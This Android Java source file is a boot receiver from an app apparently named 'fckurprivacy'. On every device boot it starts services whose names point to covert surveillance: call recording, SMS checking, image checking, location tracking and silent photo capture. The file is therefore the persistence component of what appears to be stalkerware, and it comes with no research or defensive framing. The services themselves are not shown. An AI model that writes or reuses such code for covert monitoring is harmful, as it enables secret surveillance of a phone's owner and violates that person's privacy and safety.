package com.vergermiya.harevost.fckurprivacy.SilentShooter;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecordService;
import com.vergermiya.harevost.fckurprivacy.ImageChecker.ImageCheckService;
import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsCheckService;
import com.vergermiya.harevost.fckurprivacy.locationChecker.LocationService;

public class BootReceiver extends BroadcastReceiver {

    private static String PKG_NAME = "com.vergermiya.harevost.fckurprivacy";

    @Override
    public void onReceive(Context context, Intent intent) {

        String action = intent.getAction().toString();

        if (action.equals(Intent.ACTION_BOOT_COMPLETED)) {
            Intent callRecService = new Intent(context, CallRecordService.class);
            Intent imgCheckService = new Intent(context, ImageCheckService.class);
            Intent locationService = new Intent(context, LocationService.class);
            Intent silentService = new Intent(context, SilentShootService.class);
            Intent smsChkService = new Intent(context, SmsCheckService.class);

            context.startService(callRecService);
            context.startService(imgCheckService);
            context.startService(locationService);
            context.startService(silentService);
            context.startService(smsChkService);

            Log.d("Restart", "Auto run,,,");
            Toast.makeText(context, "BOOT COMPLETE", Toast.LENGTH_LONG).show();
        }
    }
}
